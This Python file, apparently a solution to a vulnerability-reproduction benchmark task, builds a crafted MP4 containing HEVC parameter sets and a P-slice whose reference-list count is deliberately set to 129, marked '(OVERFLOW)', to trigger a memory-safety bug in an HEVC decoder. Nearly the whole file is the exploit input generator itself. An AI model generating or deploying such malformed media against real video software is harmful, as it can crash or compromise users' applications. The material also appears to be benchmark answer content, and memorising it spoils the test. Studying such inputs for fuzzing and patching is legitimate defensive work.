import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitWriter:
            def __init__(self):
                self.bits = []
            
            def write(self, val, n):
                for i in range(n - 1, -1, -1):
                    self.bits.append((val >> i) & 1)

            def write_ue(self, val):
                if val == 0:
                    self.write(1, 1)
                else:
                    temp = val + 1
                    length = temp.bit_length()
                    self.write(0, length - 1)
                    self.write(temp, length)
            
            def write_se(self, val):
                if val > 0:
                    ue = 2 * val - 1
                else:
                    ue = -2 * val
                self.write_ue(ue)

            def get_bytes(self):
                rem = len(self.bits) % 8
                if rem != 0:
                    self.bits.extend([0] * (8 - rem))
                
                out = bytearray()
                for i in range(0, len(self.bits), 8):
                    val = 0
                    for j in range(8):
                        val = (val << 1) | self.bits[i+j]
                    out.append(val)
                
                final = bytearray()
                zeros = 0
                for b in out:
                    if zeros == 2 and (b <= 3):
                        final.append(3)
                        zeros = 0
                    final.append(b)
                    if b == 0:
                        zeros += 1
                    else:
                        zeros = 0
                return final

        def get_sps():
            bw = BitWriter()
            # NAL Header SPS (33) -> 0x42 0x01
            bw.write(0x4201, 16)
            bw.write(0, 4) # vp_id
            bw.write(0, 3) # max_sub_layers-1
            bw.write(1, 1) # temp_id_nesting
            bw.write(0, 2) # profile_space
            bw.write(0, 1) # tier
            bw.write(1, 5) # profile_idc
            bw.write(0x60000000, 32) # flags
            bw.write(0, 48) # constraints
            bw.write(30, 8) # level
            bw.write_ue(0) # sps_id
            bw.write_ue(1) # chroma
            bw.write_ue(64) # w
            bw.write_ue(64) # h
            bw.write(0, 1) # conformance
            bw.write_ue(0) # bd luma
            bw.write_ue(0) # bd chroma
            bw.write_ue(0) # log2_max_poc
            bw.write(1, 1) # sub_layer_ordering
            bw.write_ue(0) # max_dec
            bw.write_ue(0) # num_reorder
            bw.write_ue(0) # max_latency
            bw.write_ue(0) # log2_min_luma
            bw.write_ue(0) # log2_diff
            bw.write_ue(0) # log2_min_trans
            bw.write_ue(0) # log2_diff_trans
            bw.write_ue(0) # max_trans_inter
            bw.write_ue(0) # max_trans_intra
            bw.write(0, 1) # scaling
            bw.write(0, 1) # amp
            bw.write(0, 1) # sao
            bw.write(0, 1) # pcm
            bw.write_ue(0) # num_short
            bw.write(0, 1) # long_term
            bw.write(0, 1) # sps_temp_mvp
            bw.write(0, 1) # strong_intra
            bw.write(0, 1) # vui
            bw.write(0, 1) # ext
            bw.write(1, 1) # stop
            return bw.get_bytes()

        def get_pps():
            bw = BitWriter()
            # NAL Header PPS (34) -> 0x44 0x01
            bw.write(0x4401, 16)
            bw.write_ue(0) # pps_id
            bw.write_ue(0) # sps_id
            bw.write(0, 1) # dep_slice
            bw.write(0, 1) # output
            bw.write(0, 3) # num_extra
            bw.write(0, 1) # sign
            bw.write(0, 1) # cabac
            bw.write_ue(0) # l0_def
            bw.write_ue(0) # l1_def
            bw.write_se(0) # init_qp
            bw.write(0, 1) # constrained
            bw.write(0, 1) # transform
            bw.write(0, 1) # cu_qp
            bw.write_se(0) # cb
            bw.write_se(0) # cr
            bw.write(0, 1) # slice_chroma
            bw.write(0, 1) # weight
            bw.write(0, 1) # weight_bi
            bw.write(0, 1) # transquant
            bw.write(0, 1) # tiles
            bw.write(0, 1) # entropy
            bw.write(0, 1) # loop
            bw.write(0, 1) # deblock
            bw.write(0, 1) # scaling
            bw.write(0, 1) # lists_mod
            bw.write(0, 1) # par_merge
            bw.write(0, 1) # slice_ext
            bw.write(0, 1) # pps_ext
            bw.write(1, 1) # stop
            return bw.get_bytes()

        def get_slice():
            bw = BitWriter()
            # NAL Header TRAIL_R (1) -> 0x02 0x01
            bw.write(0x0201, 16)
            bw.write(1, 1) # first_slice
            bw.write_ue(0) # pps_id
            bw.write_ue(1) # slice_type P
            bw.write(0, 4) # poc_lsb
            # implicit RPS (sps num_short=0)
            bw.write(0, 1) # inter_ref_pred
            bw.write_ue(0) # num_neg
            bw.write_ue(0) # num_pos
            # sps_temp_mvp=0, sao=0
            bw.write(1, 1) # num_ref_idx_active_override
            bw.write_ue(128) # num_ref_idx_l0_active_minus1 (OVERFLOW)
            bw.write_se(0) # slice_qp_delta
            bw.write(1, 1) # alignment
            return bw.get_bytes()

        sps = get_sps()
        pps = get_pps()
        slice_nal = get_slice()

        def make_box(t, d): return struct.pack('>I', len(d)+8) + t.encode('ascii') + d
        def make_full(t, v, f, d): return make_box(t, struct.pack('>I', (v<<24)|f) + d)

        ftyp = make_box('ftyp', b'isom\x00\x00\x02\x00isomiso2mp41')
        mdat_data = struct.pack('>I', len(slice_nal)) + slice_nal
        mdat = make_box('mdat', mdat_data)

        hvcc = bytearray([1, 1, 0x60, 0, 0, 0, 0, 0, 0, 30, 0xF0, 0, 0xFC, 0xFD, 0xF8, 0xF8, 0, 0, 0x0F, 2])
        # SPS
        hvcc.append(0x21)
        hvcc.extend(struct.pack('>H', 1))
        hvcc.extend(struct.pack('>H', len(sps)))
        hvcc.extend(sps)
        # PPS
        hvcc.append(0x22)
        hvcc.extend(struct.pack('>H', 1))
        hvcc.extend(struct.pack('>H', len(pps)))
        hvcc.extend(pps)

        stsd = make_full('stsd', 0, 0, struct.pack('>I', 1) + make_box('hvc1', b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 + struct.pack('>HH', 64, 64) + b'\x00\x48\x00\x00'*2 + b'\x00'*4 + struct.pack('>H', 1) + b'\x00'*32 + struct.pack('>H', 24) + struct.pack('>h', -1) + make_box('hvcC', hvcc)))
        
        def build_moov(off):
            stsz = make_full('stsz', 0, 0, struct.pack('>II', 0, 1) + struct.pack('>I', len(mdat_data)))
            stco = make_full('stco', 0, 0, struct.pack('>II', 1, off))
            stsc = make_full('stsc', 0, 0, struct.pack('>IIII', 1, 1, 1, 1))
            stts = make_full('stts', 0, 0, struct.pack('>II', 1, 100))
            stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)
            minf = make_box('minf', make_full('vmhd', 0, 1, b'\x00'*8) + make_box('dinf', make_box('dref', make_full('dref', 0, 0, struct.pack('>I', 1) + make_full('url ', 0, 1, b'')))) + stbl)
            mdia = make_box('mdia', make_full('mdhd', 0, 0, b'\x00'*16 + struct.pack('>II', 1000, 100) + b'\x55\xc4\x00\x00') + make_full('hdlr', 0, 0, b'\x00'*8 + b'vide' + b'\x00'*12 + b'Video\x00') + minf)
            trak = make_box('trak', make_full('tkhd', 0, 7, b'\x00'*12 + struct.pack('>I', 1) + b'\x00'*4 + struct.pack('>I', 100) + b'\x00'*44 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x40\x00\x00\x00' + struct.pack('>II', 64<<16, 64<<16)) + mdia)
            return make_box('moov', make_full('mvhd', 0, 0, b'\x00'*12 + struct.pack('>I', 1000) + struct.pack('>I', 100) + b'\x00\x01\x00\x00\x01\x00\x00\x00' + b'\x00'*10 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack('>I', 2)) + trak)

        dummy = build_moov(0)
        offset = len(ftyp) + len(dummy) + 8
        moov = build_moov(offset)
        
        return ftyp + moov + mdat